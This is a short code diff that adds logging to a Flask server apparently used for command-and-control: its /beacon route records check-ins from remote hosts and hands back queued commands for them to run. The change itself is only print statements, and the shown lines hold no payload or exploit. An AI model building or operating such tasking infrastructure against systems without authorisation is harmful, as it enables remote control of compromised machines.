@@ -131,6 +131,8 @@ def beacon():
     payload = data.get('payload', 'none')
     timestamp = datetime.utcnow().isoformat()
 
+    print(f"[+] Beacon received from {hostname} ({ip}) - Payload: {payload}")
+
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("INSERT INTO beacons (ip, hostname, timestamp, payload) VALUES (?, ?, ?, ?)", (ip, hostname, timestamp, payload))
@@ -141,7 +143,14 @@ def beacon():
     conn.close()
 
     commands = [cmd for _, cmd in tasks]
+
+    if commands:
+        print(f"[+] Queued tasks for {hostname}: {commands}")
+    else:
+        print(f"[-] No tasks queued for {hostname}")
+
     return jsonify({'tasks': commands}), 200
+
 
 @app.route('/result', methods=['POST'])
 def result():
